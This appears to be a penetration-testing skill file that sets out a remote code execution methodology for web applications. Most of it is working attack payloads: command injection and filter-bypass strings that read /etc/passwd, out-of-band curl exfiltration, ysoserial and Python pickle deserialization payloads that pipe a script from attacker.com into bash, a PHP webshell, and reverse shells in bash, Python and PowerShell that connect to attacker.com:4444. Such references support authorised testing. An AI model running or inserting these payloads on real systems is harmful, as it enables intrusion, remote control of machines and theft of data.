---
name: rce
description: Remote Code Execution methodology covering command injection, deserialization, file upload RCE, and code injection in web applications. Includes reverse shell payloads and post-exploitation pivoting.
version: 1.0.0
license: Apache-2.0
---

# Remote Code Execution (RCE)

## Command Injection

### Detection

```
; id
| id
&& id
` id `
$(id)
%0aid
```

Test in all user-controlled parameters that might reach OS commands: ping fields, domain lookup, file conversion tools, image processors, log viewers.

### Blind command injection (OOB)

```bash
; nslookup burpcollaborator.net
| curl http://burpcollaborator.net/`whoami`
$(curl http://burpcollaborator.net/$(id))
```

### Bypass techniques

```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'\x20'&&cat${X}/etc/passwd

# Quote bypass
c"a"t /etc/passwd
c'a't /etc/passwd

# Wildcard
/b?n/c?t /etc/passwd
```

## Deserialization RCE

**Java (ysoserial):**
```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0
```

**Python pickle:**
```python
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

**.NET (ViewState):**
Use YSoSerial.Net for ASP.NET ViewState/machineKey-based deserialization.

## File Upload RCE

1. Upload a PHP/ASPX/JSP webshell
2. Bypass extension filters: `.phtml`, `.php5`, `.pHp`, `file.php%00.jpg`
3. Bypass MIME type filters: set valid `Content-Type: image/jpeg` header
4. Find the uploaded file via directory bruteforce or error message disclosure
5. Execute commands via the webshell

**Simple PHP webshell:**
```php
<?php system($_GET['cmd']); ?>
```

## Reverse Shell Payloads

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
$c=New-Object Net.Sockets.TCPClient("attacker.com",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+">";$sb=[Text.Encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length)}
```

## Tools

- [revshells.com](https://revshells.com) — reverse shell generator
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payload library
- Burp Suite — injection point discovery

## MITRE ATT&CK

- T1059 — Command and Scripting Interpreter
- T1190 — Exploit Public-Facing Application
